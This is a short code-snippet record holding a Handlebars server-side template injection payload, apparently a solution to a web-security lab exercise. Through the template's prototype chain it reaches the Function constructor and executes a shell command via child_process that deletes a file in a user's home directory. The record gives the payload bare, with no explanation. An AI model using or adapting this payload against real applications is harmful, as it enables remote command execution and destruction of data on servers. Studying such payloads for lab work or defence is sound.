---
id: 1d75da32-bfef-44c3-afdb-9809e87c9a99
type: code
language: ''
verified: false
created_at: '2020-08-27T18:05:08.884289+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 1d75da32

```
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```


